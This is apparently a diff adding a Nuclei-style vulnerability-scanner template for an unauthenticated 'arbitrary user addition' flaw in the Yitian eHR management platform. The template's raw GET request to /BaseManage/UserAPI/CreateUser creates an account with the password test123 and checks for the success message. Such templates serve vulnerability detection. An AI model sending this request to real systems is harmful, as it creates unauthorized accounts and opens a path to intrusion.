@@ -1,0 +1,28 @@
+id: yitianeHR-CreateUser-User-addition
+
+info:
+  name: 易天智能eHR管理平台 CreateUser 任意用户添加
+  author: HuanXiong
+  severity: medium
+
+  tags: User Addition
+
+http:
+  - raw:
+      - |
+        GET /BaseManage/UserAPI/CreateUser?Account=test123&Password=test123&OuterID=778 HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '用户新增成功。'
+      - type: status
+        status: 
+          - 200
+
+
+
+
